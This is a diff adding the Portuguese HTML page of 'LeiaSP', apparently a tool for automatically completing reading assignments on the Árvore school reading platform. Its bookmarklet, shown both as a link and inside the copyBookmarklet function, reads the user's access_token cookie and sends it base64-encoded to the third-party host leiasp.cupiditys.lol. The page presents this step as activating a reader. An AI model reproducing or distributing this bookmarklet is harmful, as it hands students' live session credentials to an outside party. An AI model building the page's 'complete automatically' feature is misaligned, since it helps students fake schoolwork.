@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LeiaSP - Automatic Arvore Reader</title>
+    <link rel="stylesheet" href="/public/styles.css?v=27">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="/public/favicon.png?v=3">
+</head>
+<body>
+    <div class="container fade-in">
+        <header>
+            <div class="logo-container">
+                <pre class="ascii-logo">
+██      ███████ ██  █████      ███████ ██████  
+██      ██      ██ ██   ██     ██      ██   ██ 
+██      █████   ██ ███████     ███████ ██████  
+██      ██      ██ ██   ██          ██ ██      
+███████ ███████ ██ ██   ██     ███████ ██      
+                </pre>
+            </div>
+        </header>
+
+        <!-- Bookmarklet section (shown when no key is present) -->
+        <div id="bookmark-container" class="bookmark-container">
+            <h2>Bookmarklet</h2>
+            <p class="mb-2">Use este bookmarklet na Árvore para ativar o leitor automático</p>
+            
+            <div class="bookmarklet-options">
+                <a class="btn" href="javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Este script só funciona no Árvore!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split('access_token=')[1].split(';')[0]))}`)}();">
+                    Drag and Drop (PC)
+                </a>
+                <span class="separator">ou</span>
+                <button class="btn" onclick="copyBookmarklet()">
+                    Copiar (Mobile)
+                </button>
+            </div>
+        </div>
+
+        <div class="video-toggle">
+            Vídeos de Tutorial
+        </div>
+        <div class="video-container">
+            <div class="card">
+                <div class="video-placeholder" data-video-id="DmblUdmVGdE">
+                    <div class="video-loading-placeholder">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+            <!-- <div class="card">
+                <div class="video-placeholder" data-video-id="dQw4w9WgXcQ">
+                    <div class="video-loading-placeholder">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                        </svg>
+                    </div>
+                </div>
+            </div> -->
+        </div>
+
+        <!-- Content section (shown when key is present) -->
+        <div class="content-section" id="contentSection">
+            <div class="status-container">
+                <div class="filter-controls">
+                    <label class="checkbox-container">
+                        <input type="checkbox" id="hideCompletedCheckbox">
+                        <span class="checkbox-text">Ocultar concluídos</span>
+                    </label>
+                    <div class="button-container">
+                        <button id="searchButton" class="btn search-button" title="Buscar livros">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="11" cy="11" r="8"></circle>
+                                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                            </svg>
+                            Buscar
+                        </button>
+                        <button id="refreshButton" class="btn refresh-button" title="Atualizar atividades">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M23 4v6h-6"></path>
+                                <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
+                            </svg>
+                            Atualizar
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <div id="statusMessage" class="status-message status-info">Carregando suas atividades...</div>
+            <div class="assignments-container" id="assignmentsContainer">
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for activity details -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal" id="activityModal">
+            <div class="modal-content">
+                <span class="close-button" id="closeModal">&times;</span>
+                <h2 id="modalTitle">Detalhes da Atividade</h2>
+                <div id="modalContent"></div>
+                <div class="modal-actions">
+                    <button id="completeActivityBtn" class="btn primary-btn">Completar Automaticamente</button>
+                   <button style="display: none;" id="readActivityBtn" class="btn primary-btn">Ler</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification modal -->
+    <div class="notification-overlay" id="notificationOverlay">
+        <div class="notification-modal">
+            <div class="notification-content">
+                <span class="close-button" id="closeNotification">&times;</span>
+                <h3 id="notificationTitle">Notification</h3>
+                <p id="notificationMessage"></p>
+                <div class="notification-actions">
+                    <button id="notificationOkBtn" class="btn">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Search modal -->
+    <div class="modal-overlay" id="searchModalOverlay">
+        <div class="modal" id="searchModal">
+            <div class="modal-content">
+                <span class="close-button" id="closeSearchModal">&times;</span>
+                <h2>Buscar Livros</h2>
+                <div class="search-form">
+                    <div class="search-input-container">
+                        <input type="text" id="searchInput" placeholder="Digite o nome do livro" class="search-input">
+                    </div>
+                    <div class="search-actions">
+                        <button id="performSearchBtn" class="btn primary-btn">Buscar</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>made by flowings and cupiditys</p>
+    </footer>
+
+    <script>
+        function copyBookmarklet() {
+            const bookmarkletCode = "javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Este script só funciona no Árvore!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split('access_token=')[1].split(';')[0]))}`)}();";
+            
+            navigator.clipboard.writeText(bookmarkletCode).then(() => {
+                showNotificationFromScript('Sucesso', 'Bookmarklet copiado! Agora você pode colar no seu navegador quando estiver na Árvore.');
+            }).catch(err => {
+                console.error('Falha ao copiar:', err);
+                showNotificationFromScript('Erro', 'Falha ao copiar bookmarklet. Por favor, tente novamente.');
+            });
+        }
+        
+        function showNotificationFromScript(title, message) {
+            const notificationOverlay = document.getElementById('notificationOverlay');
+            const notificationTitle = document.getElementById('notificationTitle');
+            const notificationMessage = document.getElementById('notificationMessage');
+            
+            notificationTitle.textContent = title;
+            notificationMessage.textContent = message;
+            
+            document.body.style.overflow = 'hidden';
+            
+            notificationOverlay.style.display = 'block';
+        }
+    </script>
+    <script src="/public/script.js?v=57"></script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'94b068b05943f1e3',t:'MTc0OTEzNDI1Ny4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"94b068b05943f1e3","version":"2025.5.0","r":1,"token":"1b784219b46d493b9d500a89e65be9ed","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+</body>
+</html>
